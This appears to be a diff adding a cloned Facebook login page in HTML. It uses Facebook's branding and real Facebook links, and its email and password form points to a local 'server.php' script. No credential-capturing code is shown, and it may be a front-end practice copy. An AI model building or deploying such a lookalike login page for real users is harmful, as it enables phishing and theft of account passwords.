@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
+    <link rel="stylesheet" href="/CSS/style.css">
+    <link rel="stylesheet" href="/CSS/tablet.css" >
+    <link rel="stylesheet" href="/CSS/phone.css" >
+    <!-- font -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Oswald&display=swap" rel="stylesheet">
+</head>
+
+<body>
+    <div id="main">
+        <div id="left">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
+            <div>Facebook helps you connect and share with the people in your life.</div>
+        </div>
+        
+        <div id="right">
+            <a href="#" id="lang">English(UK)</a>
+            <img src="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico" alt="facebook" id="img-phone">
+            <form action="server.php">
+                <input type="text" required id="Email" class="input-box" placeholder="Email address or phone number">
+                <input type="password" required name="pass" id="pass" class="input-box" placeholder="Password">
+                <button type="button" id="login">Log in</button>
+                <!-- <a href="" id="login">Log in</a> -->
+                <a href="https://www.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzIzODA0MjgxLCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login&next" id="forgotten">Forgotten password?</a>
+                <div class="hr"></div>
+                <button type="button" id="create-new">Create new account</button>
+            </form>
+            <span id="spann"><a href="https://www.facebook.com/pages/create/?ref_type=registration_form" id="spann-a">Create a Page</a> for a celebrity, brand or business.</span>
+            <img src="/img/image.png" alt="" id="meta-img">
+            <div id="last-div">
+                <ul>
+                    <li><a href="https://about.meta.com/">About</a></li>
+                    <li><a href="https://m.facebook.com/help/?ref=pf">Help</a></li>
+                    <li><a href="#">More</a></li>
+                </ul>
+            </div>
+        </div>
+
+    </div>
+
+    <script src="/JS/script.js"></script>
+</body>
+
+</html>
